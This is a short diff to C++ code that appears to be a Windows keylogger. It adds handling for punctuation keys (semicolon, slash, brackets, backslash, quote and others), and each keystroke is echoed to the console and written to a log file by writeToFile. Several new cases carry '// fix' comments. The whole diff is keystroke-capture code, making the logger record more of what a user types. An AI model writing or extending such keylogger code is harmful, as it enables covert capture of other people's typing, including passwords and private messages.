@@ -327,6 +327,57 @@ bool specialKeys(int specialKey)
 			cout << "[SCROLL_LOCK]";
 			writeToFile("[SCROLL_LOCK]");
 			return true;
+		case VK_OEM_1:
+			cout << ";";
+			writeToFile(";");
+			return true;
+		case VK_OEM_PLUS:
+			cout << "=";
+			writeToFile("=");
+			return true;
+		case VK_OEM_COMMA:
+			cout << ",";
+			writeToFile(",");
+			return true;
+		case VK_OEM_MINUS:
+			cout << "-";
+			writeToFile("-");
+			return true;
+		case VK_OEM_PERIOD:
+			cout << ".";
+			writeToFile(".");
+			return true;
+		case VK_OEM_2:
+			// fix
+			cout << "/";
+			writeToFile("/");
+			return true;
+		case VK_OEM_3:
+			// fix
+			cout << "`";
+			writeToFile("`");
+			return true;
+		case VK_OEM_4:
+			// fix
+			cout << "[";
+			writeToFile("[");
+			return true;
+		case VK_OEM_5:
+			// fix
+			cout << "\\";
+			writeToFile("\\");
+			return true;
+		case VK_OEM_6:
+			// fix
+			cout << "]";
+			writeToFile("]");
+			return true;
+		case VK_OEM_7:
+			// fix
+			cout << "'";
+			writeToFile("'");
+			return true;
+
 		default:
 			return false;
 	}
